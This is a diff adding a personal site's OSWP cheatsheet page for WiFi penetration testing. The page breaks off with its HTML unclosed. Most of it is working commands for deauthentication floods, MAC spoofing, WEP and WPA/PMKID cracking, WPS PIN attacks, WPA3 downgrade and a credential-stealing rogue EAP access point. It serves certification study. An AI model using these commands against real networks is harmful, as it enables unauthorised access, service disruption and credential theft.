@@ -1,0 +1,1120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>OSWP | Cheatsheet</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="./img/oswp_icon.png" rel="icon">
+  <link href="./img/oswp_icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="./vendor/aos/aos.css" rel="stylesheet">
+  <link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="./vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="./vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="./vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Prism CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="./css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="OSWP Cheatsheet">
+  <meta property="og:description" content="A list of commands and tips for WiFi Hacking and OSWP.">
+  <meta property="og:image" content="./img/favicon.png">
+  <meta property="og:url" content="./oswp.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="OSWP Cheatsheet">
+  <meta name="twitter:description" content="A list of commands and tips for WiFi Hacking and OSWP.">
+  <meta name="twitter:image" content="./img/favicon.png">
+  <style>
+  /* Index sidebar color flow (light → dark) */
+  .section-flow-1{background-color:#e6f0fb;}
+  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#e6f0fb;}
+  .section-flow-2{background-color:#d9e5f2;}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#d9e5f2;}
+  .section-flow-3{background-color:#cbd9e9;}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#cbd9e9;}
+  .section-flow-4{background-color:#becee0;}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#becee0;}
+  .section-flow-5{background-color:#b0c2d7;}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#b0c2d7;}
+  .section-flow-6{background-color:#a3b7ce;}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#a3b7ce;}
+  .section-flow-7{background-color:#96acc5;}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#96acc5;}
+  .section-flow-8{background-color:#88a0bc;}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#88a0bc;}
+  .section-flow-9{background-color:#7b95b3;}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#7b95b3;}
+  .section-flow-10{background-color:#6e8aaa;}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#6e8aaa;}
+  .section-flow-11{background-color:#607ea1;}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#607ea1;}
+  .section-flow-12{background-color:#537398;}
+  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:#537398;}
+  .section-flow-13{background-color:#46688f;}
+  .section-flow-13 .dropdown-container,.section-flow-13 .nested-dropdown-container{background-color:#46688f;}
+  .section-flow-14{background-color:#385c86;}
+  .section-flow-14 .dropdown-container,.section-flow-14 .nested-dropdown-container{background-color:#385c86;}
+  .section-flow-15{background-color:#2b517d;}
+  .section-flow-15 .dropdown-container,.section-flow-15 .nested-dropdown-container{background-color:#2b517d;}
+  .section-flow-16{background-color:#1d4574;}
+  .section-flow-16 .dropdown-container,.section-flow-16 .nested-dropdown-container{background-color:#1d4574;}
+  .section-flow-17{background-color:#103a6b;}
+  .section-flow-17 .dropdown-container,.section-flow-17 .nested-dropdown-container{background-color:#103a6b;}
+  </style>
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <!-- ======= Header ======= -->
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <h1 class="text-light"><a href="index.html">Wencheng Xue</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" class="linkedin"><i class="bi bi-linkedin"></i></a>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="./index.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li><a href="./resume.html" class="nav-link scrollto"><i class="bi bi-file-earmark-text navicon"></i><span>Resume</span></a></li>
+          <li><a href="./portfolio.html" class="nav-link scrollto"><i class="bi bi-folder-fill navicon"></i><span>Portfolio</span></a></li>
+          <li class="dropdown">
+            <a href="./oscp.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
+                class="bi bi-laptop navicon"></i>Cheatsheets <span class="arrow">▼</span></a>
+            <ul id="submenu" class="submenu open">
+              <li><a href="./ejpt.html" class="nav-link scrollto"><img src="./img/ejpt.png" alt="eJPT Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">eJPT</a></li>
+              <li><a href="./oswp.html" class="nav-link scrollto active"><img src="./img/oswp_icon.png" alt="OSWP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
+              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP+ Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP+</a></li>
+              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSEP</a></li>
+              <li><a href="./oswe.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWE</a></li>
+              <li><a href="./osed.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSED</a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/osai_icon.svg" alt="OSAI Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSAI <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/crto_icon.png" alt="CRTO Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">CRTO <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/crtl_icon.png" alt="CRTL Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">CRTL <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>OSWP Cheatsheet</h2>
+          <p class="text-muted small">Latest update: July, 2025</p>
+          <ol>
+            <li><a href="index.html">Home</a></li>
+            <li>OSWP Cheatsheet</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <div class="cheatsheet-content">
+              <h2 id="wireless-fundamentals-adapter-setup">1. Wireless Fundamentals &amp; Adapter Setup</h2>
+              <p>Every engagement begins with an adapter that supports monitor mode and packet injection, tuned to the target&rsquo;s channel.</p>
+              <h3 id="wireless-fundamentals-adapter-setup-interfaces-capabilities">1.1 Interfaces &amp; Capabilities</h3>
+              <pre><code class="language-bash"># List wireless interfaces - Interface names and current modes
+iw dev
+
+# Detailed PHY capabilities - Confirm monitor mode + injection; note supported bands/channels
+iw list
+
+# Map interfaces to drivers - Shows the chipset/driver behind each interface
+sudo airmon-ng
+
+# Identify the driver - Useful when injection misbehaves
+sudo ethtool -i wlan0
+
+# List USB adapters - Confirm the dongle enumerated (e.g. RTL8812AU, MT7612U)
+lsusb
+
+# Unblock the radio - Clears soft/hard blocks before bringing the card up
+sudo rfkill unblock wifi</code></pre>
+              <h3 id="wireless-fundamentals-adapter-setup-monitor-mode">1.2 Monitor Mode</h3>
+              <p>Monitor mode lets the card capture every 802.11 frame, not just those addressed to it.</p>
+              <pre><code class="language-bash"># Stop interfering processes - Frees the card from NetworkManager / wpa_supplicant
+sudo airmon-ng check kill
+
+# Start monitor mode - Creates a monitor interface such as wlan0mon
+sudo airmon-ng start wlan0
+
+# Verify the mode - The type field should read ‘monitor’
+iw dev wlan0mon info
+
+# Boost TX power (region-dependent) - Higher power can reach distant APs/clients
+sudo iw dev wlan0mon set txpower fixed 3000
+
+# Stop monitor mode - Restores managed mode when finished
+sudo airmon-ng stop wlan0mon</code></pre>
+              <p>Manual alternative when <code>airmon-ng</code> is unavailable:</p>
+              <pre><code class="language-bash">sudo ip link set wlan0 down
+sudo iw wlan0 set monitor control
+sudo ip link set wlan0 up</code></pre>
+              <h3 id="wireless-fundamentals-adapter-setup-channels-bands-regulatory">1.3 Channels, Bands &amp; Regulatory</h3>
+              <pre><code class="language-bash"># Set the channel - Lock to the target before capturing
+sudo iw dev wlan0mon set channel [channel]
+
+# Set a 5 GHz channel + width - For 802.11n/ac networks
+sudo iw dev wlan0mon set channel [channel] HT40+
+
+# Set regulatory domain - Unlocks region-specific channels and TX power
+sudo iw reg set US
+
+# Show the current domain - Confirms which channels/power are permitted
+iw reg get
+
+# List allowed frequencies - Which channels the card may actually use
+iw list | grep -A1 Frequencies</code></pre>
+              <h3 id="wireless-fundamentals-adapter-setup-mac-spoofing">1.4 MAC Spoofing</h3>
+              <pre><code class="language-bash"># Randomize the MAC - Bring the interface down first
+sudo macchanger -r wlan0
+
+# Set a specific MAC - Impersonate an allow-listed client
+sudo macchanger -m [mac] wlan0
+
+# Restore the hardware MAC - Revert to the burned-in address
+sudo macchanger -p wlan0</code></pre>
+              <h3 id="wireless-fundamentals-adapter-setup-troubleshooting">1.5 Troubleshooting</h3>
+              <pre><code class="language-bash"># Injection fails - Move closer or swap to an injection-capable adapter
+sudo aireplay-ng --test wlan0mon
+
+# ‘fixed channel -1’ error - A process is hopping the card; pin the channel
+sudo iwconfig wlan0mon channel [channel]
+
+# Card keeps getting grabbed - NetworkManager / wpa_supplicant re-claimed it
+sudo airmon-ng check kill</code></pre>
+              <ul>
+                <li><strong>Handshake never validates</strong> &mdash; Re-deauth and recapture &mdash; all four EAPOL messages must be present.</li>
+              </ul>
+              <h2 id="wireless-security-protocols">2. Wireless Security Protocols</h2>
+              <p>Understanding the mechanism tells you exactly what to capture and where it breaks.</p>
+              <h3 id="wireless-security-protocols-at-a-glance">2.1 At a Glance</h3>
+              <table class="custom-table">
+                <thead>
+                  <tr><th>Description</th><th>Command</th><th>Notes on Methodology</th></tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><strong>WEP</strong></td>
+                    <td><code>RC4 with a 24-bit IV</code></td>
+                    <td>IV reuse leaks the key &mdash; crackable in minutes</td>
+                  </tr>
+                  <tr>
+                    <td><strong>WPA/WPA2-PSK</strong></td>
+                    <td><code>4-way handshake, PBKDF2(passphrase, ESSID)</code></td>
+                    <td>Offline dictionary attack on a captured handshake / PMKID</td>
+                  </tr>
+                  <tr>
+                    <td><strong>WPA3-Personal</strong></td>
+                    <td><code>SAE / Dragonfly + mandatory PMF</code></td>
+                    <td>Resists offline dictionary attacks; watch transition mode</td>
+                  </tr>
+                  <tr>
+                    <td><strong>WPA-Enterprise</strong></td>
+                    <td><code>802.1X / EAP to a RADIUS server</code></td>
+                    <td>Rogue-AP theft of the inner MSCHAPv2 credentials</td>
+                  </tr>
+                </tbody>
+              </table>
+              <h3 id="wireless-security-protocols-the-wpa-4-way-handshake">2.2 The WPA 4-Way Handshake</h3>
+              <p>The PSK and ESSID derive the PMK via PBKDF2; the four EAPOL messages then exchange the ANonce and SNonce used to build the PTK, and message 2 carries a MIC. Cracking replays candidate passphrases through the same derivation until the computed MIC matches the captured one &mdash; so a full, clean handshake (M1&ndash;M4) plus the ESSID is all that&rsquo;s needed offline.</p>
+              <h3 id="wireless-security-protocols-pmkid-clientless">2.3 PMKID (Clientless)</h3>
+              <p>Many APs place a PMKID in the first EAPOL frame, computed as <code>HMAC-SHA1(PMK, "PMK Name" | AP_MAC | STA_MAC)</code>. Because it depends only on the PMK, it can be cracked exactly like a handshake &mdash; and captured without any client connected.</p>
+              <h3 id="wireless-security-protocols-bands-channels">2.4 Bands &amp; Channels</h3>
+              <table class="custom-table">
+                <thead>
+                  <tr><th>Description</th><th>Command</th><th>Notes on Methodology</th></tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><strong>2.4 GHz</strong></td>
+                    <td><code>Channels 1&ndash;14; 1/6/11 non-overlapping</code></td>
+                    <td>Longer range, more congestion</td>
+                  </tr>
+                  <tr>
+                    <td><strong>5 GHz</strong></td>
+                    <td><code>Many channels, some under DFS</code></td>
+                    <td>Shorter range, less noise, more throughput</td>
+                  </tr>
+                  <tr>
+                    <td><strong>Protected Mgmt Frames (802.11w)</strong></td>
+                    <td><code>PMF / MFP</code></td>
+                    <td>Blocks classic deauth; mandatory under WPA3</td>
+                  </tr>
+                </tbody>
+              </table>
+              <h2 id="reconnaissance-discovery">3. Reconnaissance &amp; Discovery</h2>
+              <p>Map the airspace before attacking: enumerate APs, encryption, channels, and the clients on each.</p>
+              <h3 id="reconnaissance-discovery-scanning-the-airspace">3.1 Scanning the Airspace</h3>
+              <pre><code class="language-bash"># Sweep all networks - Channel-hops and lists APs and clients
+sudo airodump-ng wlan0mon
+
+# 2.4 GHz / 5 GHz only - Use --band a for 5 GHz
+sudo airodump-ng --band bg wlan0mon
+
+# Filter by encryption - Show only matching networks
+sudo airodump-ng --encrypt WPA2 wlan0mon
+
+# Show WPS info - Flags WPS state alongside each AP
+sudo airodump-ng --wps wlan0mon
+
+# Show manufacturers - Adds vendor column from the OUI
+sudo airodump-ng --manufacturer wlan0mon
+
+# Save the scan - Keep evidence and parse later
+sudo airodump-ng -w scan --output-format pcap,csv wlan0mon</code></pre>
+              <h3 id="reconnaissance-discovery-targeting-an-access-point">3.2 Targeting an Access Point</h3>
+              <pre><code class="language-bash"># Focus on one AP - Locks the channel and writes capture*.cap
+sudo airodump-ng --bssid [bssid] -c [channel] -w capture wlan0mon
+
+# Read signal strength - Values closer to 0 are stronger / nearer
+airodump-ng PWR column
+
+# Lock to a band + channel - Avoids hopping away from the target
+sudo airodump-ng --band a -c [channel] wlan0mon</code></pre>
+              <h3 id="reconnaissance-discovery-hidden-networks">3.3 Hidden Networks</h3>
+              <p>Cloaked SSIDs are blank until a client (re)associates.</p>
+              <pre><code class="language-bash"># Spot a hidden ESSID - A length placeholder marks a cloaked SSID
+airodump-ng (&lt;length: N&gt;)
+
+# Force it to reveal - The name appears when the client reconnects
+sudo aireplay-ng --deauth 5 -a [bssid] -c [client] wlan0mon</code></pre>
+              <h3 id="reconnaissance-discovery-clients-probe-requests">3.4 Clients &amp; Probe Requests</h3>
+              <pre><code class="language-bash"># List associated stations - Client MACs tied to each BSSID
+airodump-ng STATION column
+
+# Read probe requests - Networks a client is searching for — feeds Karma attacks
+airodump-ng Probes column</code></pre>
+              <h3 id="reconnaissance-discovery-alternative-scanners">3.5 Alternative Scanners</h3>
+              <pre><code class="language-bash"># Kismet - Rich GUI/CLI sniffer with logging and device tracking
+sudo kismet -c wlan0mon
+
+# iw scan (managed) - Quick managed-mode scan
+sudo iw wlan0 scan | grep SSID
+
+# WPS scan - Lists WPS-enabled APs and lock state
+wash -i wlan0mon</code></pre>
+              <h3 id="reconnaissance-discovery-wardriving-gps">3.6 Wardriving (GPS)</h3>
+              <pre><code class="language-bash"># Start gpsd - Feed location data to the sniffer
+sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock
+
+# Kismet with GPS - Logs APs with coordinates for mapping
+sudo kismet -c wlan0mon
+
+# airodump with GPS - Tags captures with GPS fixes
+sudo airodump-ng --gpsd -w wardrive wlan0mon</code></pre>
+              <h2 id="connecting-to-networks">4. Connecting to Networks</h2>
+              <p>Once you recover a key you have to actually join the network &mdash; the config differs per encryption type.</p>
+              <h3 id="connecting-to-networks-open-wep">4.1 Open &amp; WEP</h3>
+              <pre><code class="language-bash"># Open
+sudo iw wlan0 connect [essid]
+
+# WEP (hex key)
+sudo iw wlan0 connect [essid] key 0:[hexkey]
+sudo dhclient wlan0</code></pre>
+              <h3 id="connecting-to-networks-wpa-wpa2-wpa3">4.2 WPA / WPA2 / WPA3</h3>
+              <pre><code class="language-bash">wpa_passphrase [essid] '[password]' &gt; wifi.conf
+sudo wpa_supplicant -B -i wlan0 -c wifi.conf
+sudo dhclient wlan0
+
+# hidden network: add scan_ssid=1 to the network block</code></pre>
+              <p>Or via NetworkManager: <code>nmcli dev wifi connect [essid] password '[password]'</code></p>
+              <h3 id="connecting-to-networks-wpa-enterprise">4.3 WPA Enterprise</h3>
+              <pre><code class="language-bash">network={
+  ssid="[essid]"
+  key_mgmt=WPA-EAP
+  eap=PEAP
+  identity="[user]"
+  password="[password]"
+  phase2="auth=MSCHAPV2"
+}</code></pre>
+              <h2 id="capturing-handshakes-pmkid">5. Capturing Handshakes &amp; PMKID</h2>
+              <p>WPA/WPA2 recovery is offline, so the on-site goal is simply a valid 4-way handshake or a PMKID.</p>
+              <h3 id="capturing-handshakes-pmkid-4-way-handshake">5.1 4-Way Handshake</h3>
+              <pre><code class="language-bash"># Capture on the target - Watch the header for ‘WPA handshake’
+sudo airodump-ng --bssid [bssid] -c [channel] -w handshake wlan0mon
+
+# Confirm the capture - Should report a handshake for the BSSID
+aircrack-ng handshake-01.cap</code></pre>
+              <h3 id="capturing-handshakes-pmkid-forcing-a-handshake">5.2 Forcing a Handshake</h3>
+              <pre><code class="language-bash"># Deauth one client - Targeted — quieter and reliable
+sudo aireplay-ng --deauth 10 -a [bssid] -c [client] wlan0mon
+
+# Broadcast deauth - Hits every client (noisier)
+sudo aireplay-ng --deauth 10 -a [bssid] wlan0mon
+
+# Deauth with mdk4 - Aggressive alternative deauther
+sudo mdk4 wlan0mon d -B [bssid]</code></pre>
+              <h3 id="capturing-handshakes-pmkid-pmkid-clientless">5.3 PMKID (Clientless)</h3>
+              <pre><code class="language-bash"># Capture the PMKID - Pulls the PMKID straight from the AP
+sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1
+
+# Target one BSSID - Focus the capture
+sudo hcxdumptool -i wlan0mon -w p.pcapng --filterlist_ap=[bssid] --filtermode=2
+
+# Convert for cracking - Produces the mode-22000 hash
+hcxpcapngtool -o hash.hc22000 pmkid.pcapng</code></pre>
+              <h3 id="capturing-handshakes-pmkid-verifying-cleaning-captures">5.4 Verifying &amp; Cleaning Captures</h3>
+              <pre><code class="language-bash"># Strip to one handshake - Removes noise the crackers dislike
+wpaclean clean.cap handshake-01.cap
+
+# Inspect EAPOL frames - Confirm all four messages were captured
+tshark -r handshake-01.cap -Y eapol</code></pre>
+              <h3 id="capturing-handshakes-pmkid-automated-capture">5.5 Automated Capture</h3>
+              <pre><code class="language-bash"># besside-ng - Auto-deauths clients and grabs handshakes / WEP material
+sudo besside-ng -b [bssid] wlan0mon</code></pre>
+              <h2 id="wep">6. WEP</h2>
+              <p>WEP is broken by design: gather enough initialization vectors (IVs) and the key falls out statistically.</p>
+              <h3 id="wep-with-connected-clients">6.1 With Connected Clients</h3>
+              <p>ARP replay floods IVs quickly when a client is active.</p>
+              <pre><code class="language-bash">sudo aireplay-ng --fakeauth 0 -a [bssid] -h [your_mac] wlan0mon
+sudo aireplay-ng --arpreplay -b [bssid] -h [your_mac] wlan0mon</code></pre>
+              <pre><code class="language-bash"># Interactive packet replay - Hand-pick a frame to replay when ARP is scarce
+sudo aireplay-ng --interactive -b [bssid] -h [your_mac] wlan0mon</code></pre>
+              <h3 id="wep-without-clients">6.2 Without Clients</h3>
+              <p>Recover a keystream and forge your own traffic when no client is present.</p>
+              <pre><code class="language-bash"># Fake authentication - Associate to the AP yourself
+sudo aireplay-ng --fakeauth 0 -a [bssid] -h [your_mac] wlan0mon
+
+# Fragmentation attack - Recovers a PRGA keystream
+sudo aireplay-ng --fragment -b [bssid] -h [your_mac] wlan0mon
+
+# ChopChop attack - Alternative keystream recovery
+sudo aireplay-ng --chopchop -b [bssid] -h [your_mac] wlan0mon</code></pre>
+              <p>Forge and inject an ARP packet from the recovered keystream, then crack:</p>
+              <pre><code class="language-bash">packetforge-ng --arp -a [bssid] -h [your_mac] \
+  -k 255.255.255.255 -l 255.255.255.255 -y keystream.xor -w arp.cap
+sudo aireplay-ng --interactive -r arp.cap wlan0mon</code></pre>
+              <h3 id="wep-client-side-attacks-caffe-latte-hirte">6.3 Client-Side Attacks (Caffe-Latte &amp; Hirte)</h3>
+              <p>Attack an isolated client away from its home AP by replaying its own traffic.</p>
+              <pre><code class="language-bash"># Serve a lure AP - Fake WEP AP with Caffe-Latte (-L) and Hirte (-N)
+sudo airbase-ng -c [channel] -e [essid] -W 1 -L -N wlan0mon
+
+# Caffe-Latte - Targets a roaming client with no real AP present
+sudo aireplay-ng --caffe-latte -b [bssid] wlan0mon
+
+# Hirte (fragmented) - Variant effective against more clients
+sudo aireplay-ng --cfrag -h [client_mac] wlan0mon</code></pre>
+              <h3 id="wep-cracking-the-key">6.4 Cracking the Key</h3>
+              <pre><code class="language-bash"># PTW attack (default) - Fast statistical crack; needs ~20k–80k IVs
+aircrack-ng -b [bssid] wep-01.cap
+
+# KoreK attack - Older method; useful when PTW stalls
+aircrack-ng -K -b [bssid] wep-01.cap</code></pre>
+              <h3 id="wep-automated-wep">6.5 Automated WEP</h3>
+              <pre><code class="language-bash"># wesside-ng - Automates fake-auth, injection, and key recovery
+sudo wesside-ng -i wlan0mon -v [bssid]
+
+# easside-ng - Clientless WEP without recovering the key
+sudo easside-ng -i wlan0mon -a [your_mac] -v [bssid]</code></pre>
+              <h2 id="wpa-wpa2-psk">7. WPA / WPA2 (PSK)</h2>
+              <p>With a handshake or PMKID, recovery is a pure offline dictionary / brute-force problem.</p>
+              <h3 id="wpa-wpa2-psk-cracking-with-aircrack-ng">7.1 Cracking with aircrack-ng</h3>
+              <pre><code class="language-bash"># Dictionary attack - CPU-based crack of the handshake
+aircrack-ng -w [wordlist] -b [bssid] handshake-01.cap
+
+# Pipe a generator - Stream candidates without storing them
+crunch 8 8 -t @@@@@@@@ | aircrack-ng -w - -b [bssid] handshake-01.cap</code></pre>
+              <h3 id="wpa-wpa2-psk-cracking-with-hashcat">7.2 Cracking with hashcat</h3>
+              <p>hashcat is far faster on a GPU and handles handshakes and PMKID with one mode.</p>
+              <pre><code class="language-bash"># Convert the capture - Turns a .cap into mode 22000
+hcxpcapngtool -o hash.hc22000 handshake-01.cap
+
+# Straight dictionary - Fast GPU crack
+hashcat -m 22000 hash.hc22000 [wordlist]
+
+# Rule-based attack - Mutates each candidate
+hashcat -m 22000 hash.hc22000 [wordlist] -r /usr/share/hashcat/rules/best64.rule
+
+# Mask / brute force - Effective on PIN-style passphrases
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+# Incremental mask - Grows length automatically
+hashcat -m 22000 hash.hc22000 -a 3 --increment ?a?a?a?a?a?a?a?a
+
+# Show cracked - Re-display recovered keys
+hashcat -m 22000 hash.hc22000 --show</code></pre>
+              <h3 id="wpa-wpa2-psk-ap-less-capture">7.3 AP-less Capture</h3>
+              <p>When the real AP is out of range, a rogue AP can elicit usable material from a probing client.</p>
+              <pre><code class="language-bash"># Advertise the ESSID - Offer WPA2-CCMP so the client begins a handshake
+sudo airbase-ng -c [channel] -e [essid] -Z 4 wlan0mon
+
+# Clientless via PMKID - Usually the simplest AP-less route
+sudo hcxdumptool -i wlan0mon -w apless.pcapng --enable_status=1</code></pre>
+              <h3 id="wpa-wpa2-psk-precomputed-pmk-rainbow-tables">7.4 Precomputed PMK (Rainbow Tables)</h3>
+              <p>For a fixed ESSID, pre-hash a wordlist once and reuse it across captures.</p>
+              <pre><code class="language-bash"># Build a PMK database - Precompute PMKs for the ESSID
+airolib-ng db --import essid essid.txt &amp;&amp; airolib-ng db --import passwd [wordlist] &amp;&amp; airolib-ng db --batch
+
+# Crack with the database - Reuses the precomputed PMKs
+aircrack-ng -r db handshake-01.cap
+
+# genpmk + cowpatty - Alternative precomputed workflow
+genpmk -f [wordlist] -d pmkhash -s [essid] &amp;&amp; cowpatty -d pmkhash -r handshake-01.cap -s [essid]</code></pre>
+              <h3 id="wpa-wpa2-psk-automation">7.5 Automation</h3>
+              <pre><code class="language-bash"># wifite - Automates capture + crack across nearby targets
+sudo wifite --kill</code></pre>
+              <h2 id="wps">8. WPS</h2>
+              <p>If WPS is enabled, the 8-digit PIN is often a faster route to the PSK than cracking the handshake.</p>
+              <h3 id="wps-discovery">8.1 Discovery</h3>
+              <pre><code class="language-bash"># Find WPS access points - Lists BSSID, WPS version, and lock state
+wash -i wlan0mon</code></pre>
+              <h3 id="wps-pixie-dust-offline">8.2 Pixie-Dust (Offline)</h3>
+              <p>Exploits weak randomness in many WPS implementations &mdash; near-instant when vulnerable.</p>
+              <pre><code class="language-bash"># Reaver Pixie-Dust - Offline PIN recovery
+reaver -i wlan0mon -b [bssid] -c [channel] -K 1 -vv
+
+# pixiewps (standalone) - Compute the PIN from captured WPS values
+pixiewps -e [pke] -r [pkr] -s [ehash1] -z [ehash2] -a [authkey] -n [enonce]
+
+# Bully alternative - Second implementation to try
+bully wlan0mon -b [bssid] -c [channel] -d -v 3</code></pre>
+              <h3 id="wps-online-pin-brute-force">8.3 Online PIN Brute Force</h3>
+              <pre><code class="language-bash"># Brute force the PIN - Slow; tune delays to dodge lockouts
+reaver -i wlan0mon -b [bssid] -c [channel] -vv -N -d 15 -T 5
+
+# Try the null PIN - Some APs accept an empty PIN
+reaver -i wlan0mon -b [bssid] -c [channel] -p ''</code></pre>
+              <h3 id="wps-recover-the-psk">8.4 Recover the PSK</h3>
+              <p>A valid PIN makes the AP hand back the WPA passphrase, which Reaver/Bully print on success &mdash; no handshake cracking required.</p>
+              <h2 id="wpa3-sae">9. WPA3 (SAE)</h2>
+              <p>WPA3 replaces the crackable PSK handshake with SAE (Dragonfly), so offline dictionary attacks no longer apply &mdash; look for transition-mode fallback.</p>
+              <h3 id="wpa3-sae-identifying-wpa3-pmf">9.1 Identifying WPA3 &amp; PMF</h3>
+              <pre><code class="language-bash"># Check the AKM - The AUTH column shows SAE for WPA3
+sudo airodump-ng --bssid [bssid] -c [channel] wlan0mon
+
+# Note PMF - Mandatory PMF blocks classic deauth on WPA3-only nets
+(MFP required)</code></pre>
+              <h3 id="wpa3-sae-transition-mode-downgrade">9.2 Transition-Mode Downgrade</h3>
+              <p>WPA2/WPA3 transition networks still accept WPA2, leaving a crackable path.</p>
+              <pre><code class="language-bash"># Capture the WPA2 path - Crack the fallback handshake / PMKID
+sudo hcxdumptool -i wlan0mon -w transition.pcapng --enable_status=1</code></pre>
+              <h3 id="wpa3-sae-dragonblood-awareness">9.3 Dragonblood (Awareness)</h3>
+              <p>The Dragonblood research showed side-channel and downgrade weaknesses in early SAE implementations. Pure, patched WPA3-SAE resists offline dictionary attacks &mdash; focus your effort on transition mode, misconfiguration, and the client side.</p>
+              <h2 id="wpa-enterprise-8021x">10. WPA Enterprise (802.1X)</h2>
+              <p>Enterprise networks authenticate users via EAP, not a shared key, so the attack is a rogue AP that captures the inner credentials.</p>
+              <h3 id="wpa-enterprise-8021x-reconnaissance">10.1 Reconnaissance</h3>
+              <ul>
+                <li><strong>Identify the EAP method</strong> &mdash; Observe the client&rsquo;s EAP-Response to determine the method: PEAP / EAP-TTLS / EAP-TLS / EAP-GTC / EAP-MD5.</li>
+                <li><strong>Read the server cert</strong> &mdash; Inspect the RADIUS cert in the capture &mdash; domain / email hints help craft a convincing rogue cert.</li>
+              </ul>
+              <h3 id="wpa-enterprise-8021x-rogue-ap-with-eaphammer">10.2 Rogue AP with EAPHammer</h3>
+              <p>One-time setup, then launch a credential-stealing AP:</p>
+              <pre><code class="language-bash">./eaphammer --cert-wizard
+sudo ./eaphammer -i wlan0 --essid [essid] --auth wpa-eap --creds</code></pre>
